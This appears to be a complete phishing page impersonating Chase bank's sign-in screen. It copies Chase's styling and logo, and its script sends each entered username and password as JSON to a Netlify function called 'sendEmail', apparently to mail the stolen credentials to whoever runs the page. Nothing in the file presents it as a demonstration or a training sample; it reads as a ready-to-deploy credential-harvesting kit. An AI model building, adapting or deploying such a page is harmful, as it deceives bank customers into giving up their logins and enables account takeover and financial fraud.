<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>

<style>
body {
font-family: Arial, sans-serif;
background-color: #e6f0fa; /* lighter Chase-style blue */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 50px 40px;
border-radius: 12px;
width: 400px;
box-shadow: 0 6px 20px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
margin-bottom: 30px;
}

.logo img {
width: 180px; /* logo size */
height: auto;
}

input {
display: block;
width: 100%;
padding: 14px;
margin: 12px 0;
border-radius: 6px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 14px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 6px;
font-size: 16px;
font-weight: bold;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 18px;
font-weight: bold;
min-height: 24px; /* keeps space reserved */
}
</style>
</head>
<body>

<div class="container">

<!-- ✅ REAL CHASE LOGO USING PNG -->
<div class="logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Chase_Bank_logo.svg/2560px-Chase_Bank_logo.svg.png" alt="Chase Logo">
</div>

<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
